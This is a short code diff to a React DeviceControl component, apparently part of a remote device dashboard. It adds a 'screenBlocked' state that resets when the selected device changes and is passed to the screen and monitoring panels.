@@ -1,4 +1,4 @@
-import React, { Suspense, lazy, useState, useCallback } from 'react';
+import React, { Suspense, lazy, useState, useCallback, useEffect } from 'react';
 import CommandPanel from './CommandPanel.jsx';
 import ResultPanel from './ResultPanel.jsx';
 import LiveMonitor from './LiveMonitor.jsx';
@@ -97,12 +97,17 @@ export default function DeviceControl({
   serverLatency, deviceLatency, gcodeVersion, galleryStream, connected,
 }) {
   const [activeTab, setActiveTab]     = useState('control_center');
+  const [screenBlocked, setScreenBlocked] = useState(false);
   const [refreshKeys, setRefreshKeys] = useState(initialRefreshKeys);
   const [galleryActive, setGalleryActive] = useState(false);
   const [loadedTabs, setLoadedTabs] = useState(initialLoadedTabs);
 
   const info     = device.deviceInfo || {};
   const isOnline = device.isOnline;
+
+  useEffect(() => {
+    setScreenBlocked(false);
+  }, [device.deviceId]);
 
   const handleCommand = useCallback((command, params) => {
     sendCommand(device.deviceId, command, params);
@@ -208,6 +213,8 @@ export default function DeviceControl({
             screenReaderPushData={screenReaderPushData}
             offlineRecordingVersion={offlineRecordingVersion}
             connected={connected}
+            screenBlocked={screenBlocked}
+            setScreenBlocked={setScreenBlocked}
           />
         </div>
 
@@ -267,6 +274,8 @@ export default function DeviceControl({
           screenPushData={screenReaderPushData}
           connected={connected}
           isActive={activeTab === 'screen_reader'}
+          screenBlocked={screenBlocked}
+          setScreenBlocked={setScreenBlocked}
         />
       </div>}
 
